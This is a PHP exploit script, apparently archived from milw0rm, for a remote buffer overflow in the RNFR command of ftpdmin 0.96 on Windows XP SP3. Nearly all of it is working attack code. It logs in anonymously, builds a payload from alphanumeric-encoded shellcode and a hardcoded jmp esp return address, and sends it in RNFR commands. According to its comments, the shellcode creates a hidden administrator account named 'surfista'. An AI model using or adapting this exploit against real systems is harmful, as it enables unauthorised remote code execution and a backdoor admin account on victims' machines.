<?php
/*
   ftpdmin v. 0.96 RNFR remote buffer overflow exploit (xp sp3 / case study)
   by Nine:Situations:Group::surfista
   software site: http://www.sentex.net/~mwandel/ftpdmin/
   our site: http://retrogod.altervista.org/

   bug found by rgod in 2006, RNFR sequences can trigger a simple eip overwrite.
   We can use 272 bytes before EIP and 119 after EIP, ESP and EBP points to 
   the second memory region.
   We have a very small set of chars that we can use ,RNFR (Rename From) command  
   accept pathnames as argument, so characters whose integer representations are 
   in the range from zero through 31 and reserved chars are not allowed!
*/

error_reporting(7);
$ftp_server = "192.168.0.1";
$ftp_user   = "anonymous";
$ftp_pass   = "anon@email.com";

function ftp_cmd($cmd){
    global $conn_id;
    echo "-> ".$cmd."\n";
    $buff=ftp_raw($conn_id,$cmd);
}

                #WinExec shellcode of mine, enconded with the alpha2 tool by SkyLined, adds
                #a "surfista" admin user with pass "pass"
                #contains hardcoded address, re-encode command:
                #alpha2 esp < shdmp.txt
                $____scode="TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI".
                           "Xkb3SkfQkpBp4qo0nhBcaZPSMknMq3mValkOYCtqYPYxxhKO9okOe3BMrD5pTocS5".
                           "prnReqDWPCev32e1BWPt3sEQbRFE9T3PtqqWPRPSQPsBSUpTosqctRdWPGVa6epPN".
                           "w5F4EpRlRossG1PLw7brpOrupP5paQ1tPmaypnSYbSPtd2Pa44BOT2T3UpfOw1qTw".
                           "4gPqcpupr3VQybSrTE1kOA";      
                #do not touch, esp adjustment and subsequent call esp, very large but we have lots of unused space
                $____code ="TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI".
                           "NcXl1oK3JLsOOs8lSOMSXlQoK3zL14KOm4F22EbSrOpusBSSsUGPpipdUpesVVA";
                if (strlen($____scode) > 272) {die("[!] shellcode too large!");}
                $conn_id = ftp_connect($ftp_server) or die("(!) Unable to connect to $ftp_server");
                if (@ftp_login($conn_id, $ftp_user, $ftp_pass)) {
                    echo "(*) Connected as $ftp_user@$ftp_server\n";
                } else {
                    die("(!) Unable to connect as $ftp_user\n");
                }
                $____jnk = str_repeat("\x66",272 - strlen($____scode));
                $____eip="\x44\x3a\x41\x7e";     //0x7E413A44      jmp esp, user32.dll xp sp3
                $____jnk_ii = str_repeat("\x66",119 - strlen($____code));
                $____bof=$____scode.$____jnk.$____eip.$____code.$____jnk_ii;
                $____boom="RNFR ".str_repeat("x",0x0096);
                ftp_cmd($____boom);
                $____boom="RNFR ".$____bof;
                ftp_cmd($____boom);
                $____boom="RNFR ".str_repeat("x",0x0208);
                ftp_cmd($____boom);
                ftp_close($conn_id);
                echo "(*) Done !\n";
?>

# milw0rm.com [2009-04-13]